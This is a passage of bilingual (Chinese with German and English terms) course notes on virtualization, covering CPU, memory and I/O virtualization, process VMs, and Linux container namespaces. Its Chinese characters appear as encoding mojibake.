è´Ÿè´£æ§åˆ¶å’Œè™šæ‹ŸåŒ–ç³»ç»Ÿçš„ç¡¬ä»¶èµ„æºï¼š CPU è™šæ‹ŸåŒ–ï¼ˆCPU-Virtualisierungï¼‰ å†…å­˜è™šæ‹ŸåŒ–ï¼ˆSpeicher-Virtualisierungï¼‰ I/O è™šæ‹ŸåŒ–ï¼ˆI/O-Virtualisierungï¼‰ å¹¶éœ€è¦ç¡®ä¿Gast-BSä¸èƒ½è®¿é—®æœªåˆ†é…ç»™å®ƒçš„èµ„æºã€‚ CPU è™šæ‹ŸåŒ–ï¼ˆCPU-Virtualisierungï¼‰CPU çš„è™šæ‹ŸåŒ–æ–¹æ³•ä¸€èˆ¬æ˜¯åˆ†ä»¥ä¸‹3ç§ï¼š åŠè™šæ‹ŸåŒ–ï¼ˆParavirtualizationï¼‰ï¼š ä½¿ç”¨ç»è¿‡ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿ åœ¨è™šæ‹Ÿæœºï¼ˆVMï¼‰ä¸­è¿è¡Œï¼Œè¯¥ OS çŸ¥é“è‡ªå·±å¤„äºè™šæ‹ŸåŒ–ç¯å¢ƒä¸­ã€‚ è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆGerÃ¤te Treiberï¼‰ä¼šé€šè¿‡ Hypercalls ä¸Hypervisorè¿›è¡Œäº¤äº’ã€‚ äºŒè¿›åˆ¶ç¿»è¯‘ï¼ˆBinary Translationï¼‰ï¼š å¯ä»¥è¿è¡Œæœªç»ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿï¼Œç”šè‡³å¯ä»¥åœ¨ä¸åŒæ¶æ„ä¸Šè¿è¡Œï¼ˆä¾‹å¦‚ x86 ä¸Šæ¨¡æ‹Ÿ ARMï¼‰ã€‚ Hypervisorä¼šè§£é‡Š/æ¨¡æ‹ŸGast-BSçš„éƒ¨åˆ†äºŒè¿›åˆ¶ä»£ç ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ€§èƒ½å¼€é”€ï¼ˆPerformance-Overheadï¼‰ è¿™ç§Hypervisorçš„å®ç°éå¸¸å¤æ‚ã€‚ ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ï¼ˆHardware-assisted Virtualizationï¼‰ å¯ä»¥è¿è¡Œæœªç»ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥å®ç°é«˜æ•ˆçš„è™šæ‹Ÿæœºï¼ˆeffizienten VMsï¼‰ï¼Œå‡å°‘æ€§èƒ½æŸå¤±ã€‚æ‰€ä»¥æ˜¯ç›®å‰æœ€ä¸»æµçš„ã€‚ ä¸æ™®é€šæ“ä½œç³»ç»Ÿä¸­çš„å†…æ ¸ç©ºé—´ï¼ˆKernel Spaceï¼‰ä¸ç”¨æˆ·ç©ºé—´ï¼ˆUser Spaceï¼‰ä¸åŒï¼ˆä½†ç›¸ä¼¼ï¼‰çš„æ˜¯ï¼Œæˆ‘ä»¬è¿™é‡Œä¼šè®¨è®ºçš„æ˜¯é«˜æƒé™çš„ ç³»ç»Ÿæ¨¡å¼ï¼ˆSystem Modeï¼‰ å’Œ ç”¨æˆ·æ¨¡å¼ï¼ˆUser Modeï¼‰ã€‚Hypervisor ä¼šåœ¨ç³»ç»Ÿæ¨¡å¼ï¼ˆSystem Modeï¼‰è¿è¡Œï¼Œè€ŒGuest-BSåˆ™æ˜¯ä¼šåœ¨ç”¨æˆ·æ¨¡å¼ï¼ˆUser Modeï¼‰è¿è¡Œã€‚ æŸäº›åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œçš„æŒ‡ä»¤ä¼šè¢« Hypervisor åœ¨ç³»ç»Ÿæ¨¡å¼ä¸‹æ‹¦æˆªï¼Œä»¥ç¡®ä¿Hypervisor æ‹¥æœ‰å¯¹è™šæ‹Ÿæœºçš„å®Œå…¨æ§åˆ¶ã€‚ ï¼ˆå¥—å¨ƒï¼ŒUser Modeé‡Œåˆæœ‰Virtual User Mode å’ŒVirtual System Modeã€‚ï¼‰ ISAä¸­çš„æŒ‡ä»¤å¯ä»¥åˆ†ä¸ºä»¥ä¸‹3ç±»ï¼š ç‰¹æƒæŒ‡ä»¤ï¼ˆPrivileged Instructionsï¼‰ï¼š åªèƒ½åœ¨ç³»ç»Ÿæ¨¡å¼ï¼ˆSystem Modeï¼‰ä¸‹æ‰§è¡Œã€‚ å¦‚æœåœ¨ç”¨æˆ·æ¨¡å¼ï¼ˆUser Modeï¼‰ä¸‹æ‰§è¡Œï¼Œåˆ™ä¼šè§¦å‘é™·é˜±ï¼ˆTrapï¼‰ï¼Œç”± Hypervisor å¤„ç†ã€‚ æ•æ„ŸæŒ‡ä»¤ï¼ˆSensitive Instructionsï¼‰ï¼š å…¶ä¸­åˆåˆ†ä¸º æ§åˆ¶æ•æ„ŸæŒ‡ä»¤ï¼ˆControl-Sensitive Instructionsï¼‰ï¼šå°†ä¿®æ”¹ç³»ç»Ÿé…ç½®ï¼ˆä¾‹å¦‚ ä¿®æ”¹é¡µè¡¨ï¼ˆPage Tablesï¼‰ï¼‰ ä¸è¡Œä¸ºæ•æ„ŸæŒ‡ä»¤ï¼ˆBehaviour-Sensitive Instructionsï¼‰ï¼šè¿™äº›æŒ‡ä»¤åœ¨ä¸åŒæ¨¡å¼ä¸‹ï¼ˆç”¨æˆ·æ¨¡å¼ vs. ç³»ç»Ÿæ¨¡å¼ï¼‰çš„è¡Œä¸ºä¹Ÿæ˜¯ä¸åŒçš„ã€‚ æ— å®³æŒ‡ä»¤ï¼ˆInnocuous Instructionsï¼‰ï¼š ä¸å±äºå‰2ç±»çš„åˆ™éƒ½å±äºè¿™ç±»ã€‚ è™šæ‹ŸåŒ–éœ€è¦ç¡®ä¿å…¶ä¸­çš„æ•æ„ŸæŒ‡ä»¤ï¼ˆSensitive Instructionsï¼‰å¿…é¡»æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼ˆPrivileged Instructionsï¼‰çš„å­é›†ã€‚ åä¾‹å¯ä»¥å‚è€ƒx86æ¶æ„ä¸­çš„POPF æŒ‡ä»¤ï¼ˆä»æ ˆåŠ è½½æ ‡å¿—å¯„å­˜å™¨ Flagsï¼‰ã€‚ å†…å­˜è™šæ‹ŸåŒ–ï¼ˆSpeicher-Virtualisierungï¼‰åœ¨æ­£å¸¸çš„éè™šæ‹ŸåŒ–æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ ä¼šç›´æ¥ç®¡ç†ç‰©ç†å†…å­˜å¹¶åˆ†é…ç»™ä¸åŒçš„è¿›ç¨‹ï¼Œåˆ©ç”¨å‰é¢å­¦åˆ°çš„Seitentabelle(Page Table)ã€‚ä½†åœ¨è™šæ‹ŸåŒ–çš„æƒ…å†µä¸‹ï¼ŒHypervisor éœ€è¦ä½œä¸ºæœ€é«˜ç®¡ç†è€…ï¼ˆÃ¼bergeordnete Instanzï¼‰è´Ÿè´£å†…å­˜èµ„æºåˆ†é…ï¼Œç¡®ä¿Gast-BSä¸èƒ½éšæ„è®¿é—®ç‰©ç†å†…å­˜ä¸”åªèƒ½â€œçœ‹åˆ°â€åˆ†é…ç»™å®ƒçš„éƒ¨åˆ†ã€‚ ä¸‹é¢ä»‹ç»å†…å­˜è™šæ‹ŸåŒ–çš„2ä¸­æ–¹æ³•ï¼š å½±å­é¡µè¡¨ï¼ˆShadow Page Table, SPTï¼‰ ç¡¬ä»¶è¾…åŠ©çš„äºŒçº§åœ°å€è½¬æ¢ï¼ˆSecond Level Address Translation, SLATï¼‰ å½±å­é¡µè¡¨ï¼ˆShadow Page Table, SPTï¼‰åœ¨è¿™ä¸ªæ–¹æ³•é‡Œä¸€å…±å­˜åœ¨ä¸‰ä¸ªå†…å­˜æŠ½è±¡å±‚ï¼š ç‰©ç†å†…å­˜ ï¼ˆHost-Physische Adressen, HPAï¼‰ Hypervisor å¯¹ç‰©ç†å†…å­˜çš„æŠ½è±¡ å³åˆ†é…ç»™Gast-BSçš„å†…å­˜ ï¼ˆGast-Physische Adressenï¼‰ã€‚è¿™äº›å†…å­˜å¯¹äºGast-BSæ¥è¯´æ˜¯è¿ç»­çš„ï¼Œä½†æ˜¯åœ¨å®é™…çš„ç‰©ç†å†…å­˜é‡Œä¸ä¸€å®šè¿ç»­ã€‚ è™šæ‹Ÿå†…å­˜ï¼ˆ Virtueller Speicherï¼‰ Guest OS ç»´æŠ¤è‡ªå·±çš„é¡µè¡¨ï¼ˆè¿™äº›é¡µè¡¨ ä¸ä¼š è¢« MMUï¼ˆå†…å­˜ç®¡ç†å•å…ƒï¼‰ ç›´æ¥ä½¿ç”¨ã€‚ï¼‰ï¼Œè€ŒHypervisorç»´æŠ¤å½±å­é¡µè¡¨ï¼ˆSPTï¼‰ã€‚ä¸ºäº†ä¿æŒé¡µè¡¨çš„åŒæ­¥ï¼ŒGast-BSåªèƒ½ä»¥åªè¯»ï¼ˆRead-Onlyï¼‰æ–¹å¼è®¿é—®å®ƒçš„é¡µè¡¨ï¼Œä»»ä½•å†™å…¥é¡µè¡¨çš„å°è¯•éƒ½ä¼šè¢« Hypervisor æ‹¦æˆªï¼ˆTrapï¼‰ï¼Œè®©Hypervisorå¥½æ›´æ–°Gast-BSçš„é¡µè¡¨ä¸SPTã€‚ ç›¸å½“äºå½±å­é¡µè¡¨æ˜¯ä¸­é—´çš„é‚£å±‚é¡µè¡¨ã€‚ SPTçš„é—®é¢˜ä¹Ÿå¾ˆæ˜¾è€Œæ˜“è§ï¼šç®¡ç†èµ·æ¥éå¸¸å¤æ‚è€Œä¸”å¼€é”€å¾ˆé«˜ï¼ˆhoher Overheadï¼‰ã€‚ äºŒçº§åœ°å€è½¬æ¢ï¼ˆSecond Level Address Translation, SLATï¼‰SLAT ç”± CPU æä¾›ç¡¬ä»¶æ”¯æŒï¼Œå°†Gast-BSçœ‹åˆ°çš„ Gast ç‰©ç†åœ°å€ (Gast-Physische Adressen) æ˜ å°„åˆ°ä¸»æœºç‰©ç†åœ°å€ (HPA)ã€‚Hypervisor ä»…åœ¨ Guest OS è®¿é—®æœªæ˜ å°„çš„åœ°å€æ—¶æ‰ä»‹å…¥ï¼Œå‡å°‘æ€§èƒ½å¼€é”€ã€‚ ä¾‹å­ï¼š Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) è™šæ‹Ÿæœºçš„å†…å­˜ç®¡ç†è·Ÿè¿›ç¨‹ç®¡ç†çš„å†…å­˜åˆ†é…é—®é¢˜ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦è€ƒè™‘è¯¥ç»™æ¯å°è™šæ‹Ÿæœºåˆ†é…å¤šå°‘å†…å­˜ã€‚ é™æ€åˆ†é…ä¼šå¯¼è‡´ä¸çµæ´»ï¼Œå ç”¨å›ºå®šèµ„æºçš„é—®é¢˜ã€‚ åŠ¨æ€åˆ†é…çš„åŸç†åˆ™æ˜¯è¿‡é‡åˆ†é…ï¼ˆOvercommitmentï¼‰ï¼ˆå‡è®¾å¹¶éæ‰€æœ‰ VMs åŒæ—¶éœ€è¦å…¨éƒ¨å·²åˆ†é…çš„å†…å­˜ã€‚ï¼‰ä½†è¿™æ ·ä¼šåœ¨å›æ”¶å·²åˆ†é…çš„å†…å­˜æ—¶ç¢°åˆ°é—®é¢˜ï¼Œå› ä¸ºHypervisor æ— æ³•çŸ¥é“å“ªäº›å†…å­˜é¡µæ˜¯é‡è¦çš„ï¼Œå“ªäº›å¯ä»¥é‡Šæ”¾ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Ballooning (â€œballoon driverâ€)ï¼šGast-BSå†…éƒ¨çš„è½¯ä»¶ä¸Hypervisorè¿›è¡Œé€šä¿¡ï¼šï¼ˆæ²¡æœ‰å†…å­˜å‹åŠ›çš„è™šæ‹Ÿæœºï¼‰é‡Šæ”¾å†…å­˜ï¼ˆâ€œæ°”çƒæ”¾æ°”â€ï¼‰ï¼›ç”³è¯·å†…å­˜ï¼ˆâ€ç»™æ°”çƒå……æ°”â€œï¼‰ã€‚ I/O è™šæ‹ŸåŒ–ï¼ˆI/O-Virtualisierungï¼‰ä»‹ç»å‡ ç§I/O è™šæ‹ŸåŒ–çš„æŠ€æœ¯ï¼š å®Œæ•´è™šæ‹ŸåŒ–/ä»¿çœŸï¼ˆFull Virtualization/Emulationï¼‰Hypervisorç®¡ç†æ‰€æœ‰ Guest VM çš„I/Oè¯·æ±‚ï¼Œè°ƒåº¦I/Oèµ„æºã€‚ Hypervisor é€šè¿‡è½¯ä»¶å¤šè·¯å¤ç”¨ï¼ˆmultiplextï¼‰æˆ–ä»¿çœŸï¼ˆemuliertï¼‰I/O è®¾å¤‡ã€‚ Hypervisorä¼šæ‹¦æˆªGuest VMçš„I/Oè¯·æ±‚ï¼Œå¹¶å°†å…¶è½¬å‘åˆ°ç‰©ç† I/O è®¾å¤‡ã€‚ ä¼˜åŠ¿ï¼š é«˜æ•ˆ Gemultiplexte I/O-GerÃ¤te sind effizientï¼› é€æ˜ Transparentes GerÃ¤te-Managementã€‚ é—®é¢˜ï¼š å®ç°èµ·æ¥å¤ªå¤æ‚ï¼› Hypervisor éœ€è¦ä¸ºå¤šç§ I/O è®¾å¤‡æä¾›é©±åŠ¨ç¨‹åºã€‚ï¼› å¦‚æœ I/O è®¾å¤‡å®Œå…¨ä»¿çœŸï¼ˆEmulationï¼‰ï¼Œä¼šäº§ç”Ÿè¾ƒé«˜çš„æ€§èƒ½å¼€é”€ï¼ˆOverheadï¼‰ã€‚ åŠè™šæ‹ŸåŒ–ï¼ˆParavirtualizationï¼‰å°† I/O è®¾å¤‡é©±åŠ¨åˆ†ä¸ºä¸¤éƒ¨åˆ† ä½¿ç”¨æ‹†åˆ†é©±åŠ¨æ¶æ„ï¼ˆSplit-Driver-Architekturï¼‰ åç«¯é©±åŠ¨ï¼ˆBackend-Treiberï¼‰ï¼šè¿è¡Œåœ¨ Hypervisor æˆ– I/O å¤„ç† VM å†…ï¼Œå®é™…ç®¡ç†ç‰©ç†è®¾å¤‡ã€‚ å‰ç«¯é©±åŠ¨ï¼ˆFrontend-Treiberï¼‰ï¼šè¿è¡Œåœ¨ Gast-BS å†…ï¼Œä¸åç«¯é©±åŠ¨é€šä¿¡ã€‚ ä¼˜åŠ¿ï¼š å¼€é”€æ›´ä½ï¼ˆGeringer Overheadï¼‰ï¼› æ›´å®¹æ˜“å®ç°ï¼› Guest OS é€‚é…æ›´çµæ´»ï¼Œå¯ä»¥é€šè¿‡ å·²æœ‰é©±åŠ¨æ”¯æŒæ–°è®¾å¤‡ã€‚ é—®é¢˜ï¼š Guest OS éœ€è¦é¢å¤–ä¿®æ”¹æˆ–å®‰è£…ç‰¹å®šé©±åŠ¨ã€‚ è®¾å¤‡åŸŸï¼ˆDevice Domainsï¼‰ä¸€å°VMå……å½“æ‰€æœ‰I/Oè®¾å¤‡çš„æ¥å£ï¼ˆåœ¨Xenä¸­ç§°ä¸ºDomain 0æˆ–â€dom0â€ï¼‰ï¼Œå…¶ä»–VMsé€šè¿‡è¿™å°VMè®¿é—®I/Oè®¾å¤‡ï¼Œè€Œä¸æ˜¯ç›´æ¥è®¿é—®ç¡¬ä»¶ã€‚ ç›´æ¥ I/O è®¿é—®ï¼ˆDirect I/Oï¼‰ä½¿ç”¨ç¡¬ä»¶æ”¯æŒçš„ I/O è®¾å¤‡å¤šè·¯å¤ç”¨ï¼ˆMultiplexingï¼‰ã€‚ I/O-MMUï¼ˆI/O å†…å­˜ç®¡ç†å•å…ƒï¼‰ è´Ÿè´£ç®¡ç† Guest VM çš„è®¾å¤‡å†…å­˜ï¼š è´Ÿè´£ I/O åœ°å€å’Œä¸­æ–­ï¼ˆInterruptï¼‰çš„æ˜ å°„ã€‚ éš”ç¦» DMAï¼ˆç›´æ¥å†…å­˜è®¿é—®ï¼‰è¯·æ±‚ï¼Œé˜²æ­¢ VMs äº’ç›¸å¹²æ‰°ã€‚ ä¼˜åŠ¿ï¼š Guest VM ç›´æ¥è®¿é—®ç‰©ç†è®¾å¤‡ï¼Œæé«˜ I/O æ•ˆç‡ã€‚ éƒ¨åˆ† I/O å¤„ç†ç”±ç¡¬ä»¶å®Œæˆï¼Œå‡å°‘ Hypervisor è´Ÿæ‹…ã€‚ å•æ ¹ I/O è™šæ‹ŸåŒ–ï¼ˆSingle Root I/O Virtualization, SR-IOVï¼‰I/O è®¾å¤‡æœ¬èº«æ”¯æŒè™šæ‹ŸåŒ–ï¼Œå°† ä¸€ä¸ªç‰©ç†è®¾å¤‡æ‹†åˆ†ä¸ºå¤šä¸ªè™šæ‹ŸåŠŸèƒ½ï¼ˆ Virtual Functionsï¼ŒVFï¼‰ï¼Œä¼šç»•è¿‡Hypervisorçš„I/Oå¤„ç†ã€‚ Gast VM çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ I/O è®¾å¤‡ï¼Œä½†å®é™…ä¸Šå®ƒå…±äº«äº†åŒä¸€ä¸ªç‰©ç†è®¾å¤‡ã€‚ ï¼ˆæ„Ÿè§‰å¤§éƒ¨åˆ†è™šæ‹ŸåŒ–çš„æŠ€æœ¯éƒ½æ˜¯é€šè¿‡å‡è½»Hypervisorçš„è´Ÿæ‹…æ¥æé«˜æ•ˆç‡çš„ï¼‰ è¿›ç¨‹è™šæ‹Ÿæœºï¼ˆProcess Virtual Machinesï¼‰è·Ÿç³»ç»Ÿè™šæ‹Ÿæœºä¸åŒçš„æ˜¯ï¼Œè¿›ç¨‹è™šæ‹Ÿæœºï¼ˆProcess VMï¼‰åªç»™å•ä¸ªï¼ˆæˆ–è€…å¤šä¸ªï¼‰è¿›ç¨‹æä¾›è™šæ‹Ÿè¿è¡Œç¯å¢ƒï¼Œä½¿åº”ç”¨ç¨‹åºå¯ä»¥ç‹¬ç«‹äºåº•å±‚æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶æ¶æ„è¿è¡Œã€‚ Runtimeä¼šç»™ç”¨æˆ·ç©ºé—´è¿›ç¨‹ï¼ˆUser-Space-Prozesseï¼‰æä¾›è™šæ‹Ÿè¿è¡Œç¯å¢ƒï¼Œå¹¶ä¸”è´Ÿè´£å®ç° ABIæ¥å£ï¼ˆç”±ç³»ç»Ÿè°ƒç”¨æ¥å£ï¼ˆSystemcall Interfaceï¼‰å’Œç”¨æˆ·æŒ‡ä»¤é›†æ¶æ„ï¼ˆUser-ISAï¼‰ç»„æˆï¼‰ã€‚ç®€å•æ¥è®²å°±æ˜¯Runtimeéœ€è¦è´Ÿè´£è½¬æ¢/ç¿»è¯‘Systemcallå’ŒISAçš„æŒ‡ä»¤ã€‚ å¯¹åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œæ•´ä¸ªâ€œç³»ç»Ÿâ€ç”± ABI æ¥å£å†³å®šï¼Œè€Œä¸ä¾èµ–åº•å±‚ç¡¬ä»¶æˆ–æ“ä½œç³»ç»Ÿã€‚ Runtimeæ˜¯ç±»ä¼¼äºHypervisorçš„ä¸­é—´å±‚ï¼Œä½†ä»–ä»¬çš„æ ¸å¿ƒä½œç”¨ä¹‹ç±»çš„å®Œå…¨ä¸ä¸€æ ·ã€‚ è¿›ç¨‹è™šæ‹Ÿæœºçš„ä¼˜åŠ¿ï¼š ä»¿çœŸï¼ˆEmulationï¼‰ï¼šç¨‹åºå¯ä»¥åœ¨ä¸åŒ ISAï¼ˆæŒ‡ä»¤é›†æ¶æ„ï¼‰ä¸Šè¿è¡Œã€‚ å¹³å°æ— å…³æ€§ï¼ˆPlattform-UnabhÃ¤ngigkeitï¼‰ï¼šç¨‹åºå¯ä»¥åœ¨ä¸åŒ OS è¿è¡Œã€‚ æ€§èƒ½ä¼˜åŒ–ï¼ˆPerformance-Optimierungï¼‰ï¼šäºŒè¿›åˆ¶ä¼˜åŒ–å™¨ï¼ˆBinary Optimizerï¼‰ä¼šä¼˜åŒ–ä»£ç ã€‚ é«˜çº§è¯­è¨€è™šæ‹Ÿæœºï¼ˆHigh-Level-Language VMs, HLL VMsï¼‰ä½œä¸ºè¿›ç¨‹è™šæ‹Ÿæœºçš„ä¸€ç§ï¼Œä¼šæä¾›ä¸€ä¸ªä¸åº•å±‚æ¶æ„æ— å…³çš„è™šæ‹Ÿ ISAï¼ˆ Plattform-unabhÃ¤ngige virtuelle ISAï¼‰ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºä¸ä¾èµ–ç‰¹å®šçš„æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰å’Œç¡¬ä»¶æ¶æ„ã€‚ä¸»è¦æ˜¯ä¸ºäº†è¿è¡Œé«˜çº§ç¼–ç¨‹è¯­è¨€çš„ä»£ç ã€‚ æ¯”å¦‚è¯´ Java Virtual Machine (JVM) å¯ä»¥è§£é‡Šå’Œæ‰§è¡Œ Java å­—èŠ‚ç ï¼ˆJava Bytecodeï¼‰ï¼Œè®© Java ä»£ç å¯ä»¥åœ¨ Windowsã€Linuxã€Mac ç­‰ä¸åŒå¹³å° ä¸Šè¿è¡Œã€‚ å¦‚æœå¤šä¸ªè¿›ç¨‹éœ€è¦å…±äº«èµ„æºå¹¶ç›¸äº’äº¤äº’ï¼ˆinteragierenï¼‰ï¼Œåˆ™é€šå¸¸ä½¿ç”¨æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–ï¼ˆOS-level Virtualizationï¼‰ã€‚ æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–ï¼ˆOS-level-Virtualizationï¼‰æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–ï¼ˆOS-level-Virtualizationï¼‰å¯ä»¥è¿è¡Œå¤šä¸ªéš”ç¦»çš„åº”ç”¨è¿›ç¨‹ï¼Œå…±äº«åŒä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ã€‚ Container Leichtgewichtige VirtualisierungsmÃ¶glichkeit è½»é‡åŒ– stellen eine Laufzeitumgebung fÃ¼r User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen mÃ¶glich Containeræ˜¯OS-Level Virtualizationçš„ä¸€ç§å®ç°ã€‚ åœ¨ä¼ ç»Ÿçš„ Unix æ“ä½œç³»ç»Ÿä¸­ï¼Œä¸€äº›èµ„æºæ˜¯å…¨å±€ç®¡ç†çš„ï¼Œæ¯”å¦‚è¯´PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamenï¼Œä½¿å¾—å…·æœ‰ root æƒé™çš„è¿›ç¨‹å¯ä»¥è®¿é—®å’Œå½±å“å…¶ä»–è¿›ç¨‹ï¼Œå¸¦æ¥å®‰å…¨éšæ‚£ã€‚æ‰€ä»¥å¸Œæœ›å°†ä»–ä»¬éš”ç¦»å¼€ã€‚ Namespaces æ˜¯ Container çš„åŸºç¡€ï¼šæŠ½è±¡å‡ºå¯¹ç³»ç»Ÿå…¨å±€èµ„æºçš„è®¿é—® ï¼ˆæ¯”å¦‚è¯´Filesystem-Mount-Points, Netzressourcen, PIDs, etc.ï¼‰ï¼Œå°†æ‰€æœ‰è¿›ç¨‹æ‹†æˆdisjoint subsetsï¼Œä½¿å¾—æ¯ä¸ªsubseté‡Œçš„è¿›ç¨‹ä¼šè®¤ä¸ºè‡ªå·±æ˜¯æ•´ä¸ªç³»ç»Ÿä¸­å”¯ä¸€çš„è¿›ç¨‹ã€‚ Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespacesä½œç”¨ï¼šBenennung und Adressierung von Ressourcenï¼Œå®ç°è¿›ç¨‹çº§åˆ«çš„èµ„æºéš”ç¦»ã€‚ ä¸»è¦è´Ÿè´£éš”ç¦»ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ä¸æ€»æ˜¯éœ€è¦éš”ç¦»æ‰€æœ‰ç³»ç»Ÿèµ„æºã€‚å› æ­¤ï¼ŒLinux æä¾›äº†å¤šä¸ªç‹¬ç«‹çš„ Namespaceï¼Œä»¥å®ç°æ›´çµæ´»çš„éš”ç¦»æ–¹å¼ï¼Œå¹¶é¿å…ä¸å¿…è¦çš„èµ„æºæµªè´¹ï¼š UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen ä¸»æœºåå’ŒåŸŸå) ä¾‹å¦‚ï¼Œåœ¨ Docker å®¹å™¨ä¸­ï¼Œæ¯ä¸ªå®¹å™¨å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„ä¸»æœºåï¼Œè€Œä¸ä¼šå½±å“å®¿ä¸»æœºã€‚ IPC: Inter-Process Communication isolieren IPC-Ressourcen éš”ç¦»è¿›ç¨‹é—´é€šä¿¡ã€ ä¾‹å¦‚ï¼Œä¸åŒçš„å®¹å™¨ä¸èƒ½è®¿é—®å½¼æ­¤çš„å…±äº«å†…å­˜å’Œæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæé«˜å®‰å…¨æ€§ã€‚ Network: isolieren Netzressourcen éš”ç¦»ç½‘ç»œè®¾å¤‡ã€IP åœ°å€ã€ç«¯å£ã€è·¯ç”±è¡¨ç­‰ï¼Œå…è®¸ä¸åŒ Namespace æ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œæ ˆã€‚ PID: isolieren PID-RÃ¤ume Prozesse in unterschiedlichen PID-Namespaces kÃ¶nnen dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es kÃ¶nnen verschachtelte (engl. nested) PID-Namespaces erstellt werden å¯ä»¥å¥—å¨ƒ åœ¨åŒä¸€ PID å‘½åç©ºé—´å†…ï¼Œè¿›ç¨‹å¯ä»¥æ­£å¸¸é€šä¿¡ï¼›åœ¨ä¸åŒ PID å‘½åç©ºé—´ä¹‹é—´ï¼Œçˆ¶ Namespace å¯ä»¥å‘å­ Namespace å‘é€ä¿¡å·ï¼Œä½†å­ Namespace ä¸èƒ½å½±å“çˆ¶ Namespaceã€‚ Mount: isolieren Mount-Points des Dateisystems éš”ç¦»æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹ï¼Œå…è®¸ä¸åŒçš„ Namespace çœ‹åˆ°ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè§†å›¾ã€‚ ï¼ˆåœ¨ Linux ä¸­ï¼ŒæŒ‚è½½ç‚¹ï¼ˆMount Pointï¼‰ æ˜¯æŒ‡å°†ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿè¿æ¥åˆ°ç›®å½•ç»“æ„ä¸­çš„ç‰¹å®šä½ç½®ï¼Œä½¿å…¶å†…å®¹å¯ä»¥é€šè¿‡è¯¥ç›®å½•è®¿é—®ã€‚ï¼‰ æŒ‚è½½ç±»å‹ (Mount-Typ)ï¼š Shared Mount å…±äº«æŒ‚è½½ï¼šæ¥æ”¶+ä¼ é€’ è¯¥æŒ‚è½½ç‚¹çš„ mount å’Œ umount äº‹ä»¶ä¼šåœ¨ Peer Group ä¹‹é—´ä¼ æ’­ã€‚ ä¾‹å¦‚ï¼Œåœ¨ Shared Mount ä¸ŠæŒ‚è½½ä¸€ä¸ªæ–°ç›®å½•ï¼Œæ‰€æœ‰å…±äº«è¯¥æŒ‚è½½ç‚¹çš„è¿›ç¨‹éƒ½ä¼šçœ‹åˆ°è¿™ä¸ªå˜æ›´ã€‚ Private Mount ç§æœ‰æŒ‚è½½ï¼šä¸æ¥æ”¶+ä¸ä¼ é€’ æŒ‚è½½ç‚¹ä¸ä¼šæ¥æ”¶ï¼Œä¹Ÿä¸ä¼šå‘å¯¹ç­‰ç»„ï¼ˆPeer Groupsï¼‰ä¼ é€’äº‹ä»¶ã€‚ Der Mount-Point empfÃ¤ngt und leitet keine Events zu Peer Groups weiter. Slave Mount ä»å±æŒ‚è½½ï¼šæ¥æ”¶+ä¸ä¼ é€’ Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount ä¸å¯ç»‘å®šæŒ‚è½½ï¼š Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. ä¸èƒ½è¢«ç»‘å®šçš„ç§äººæŒ‚è½½ã€‚ (Bind MountæŒ‡çš„æ˜¯å…è®¸å°†ä¸€ä¸ªç›®å½•æˆ–æ–‡ä»¶æŒ‚è½½åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œä½¿å…¶åœ¨å¤šä¸ªè·¯å¾„ä¸‹å¯è§ã€‚) Peer Groupsï¼ˆå¯¹ç­‰ç»„ï¼‰ï¼šPeer Group æ˜¯ä¸€ç»„å…±äº« mount äº‹ä»¶çš„æŒ‚è½½ç‚¹ï¼Œå½“ä¸€ä¸ª Shared Mount è¢«åˆ›å»ºæ—¶ï¼Œå®ƒä¼šè¢«æ·»åŠ åˆ°æŸä¸ª Peer Groupã€‚æ‰€æœ‰ Peer Group å†…çš„æŒ‚è½½ç‚¹éƒ½ä¼šåŒæ­¥ mount å’Œ umount äº‹ä»¶ã€‚ User: isolieren User- und Group-IDs éš”ç¦»ç”¨æˆ· ID å’Œæƒé™ ErhÃ¶hte Privilegien sind nur innerhalb des User Namespace gÃ¼ltig. kÃ¶nnen auch verschachtelte User-Namespaces erstellt werden. å¥—å¨ƒ ä¾‹å¦‚ï¼Œå®¹å™¨å†…çš„ root å®é™…ä¸Šæ˜¯å®¿ä¸»æœºçš„æ™®é€šç”¨æˆ·ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚ Linux Control Groups (cgroups)ä¸»è¦è´Ÿè´£é™åˆ¶ã€‚ ä½œç”¨ï¼š cgroups unterteilen Prozesse in hierarchische Gruppen 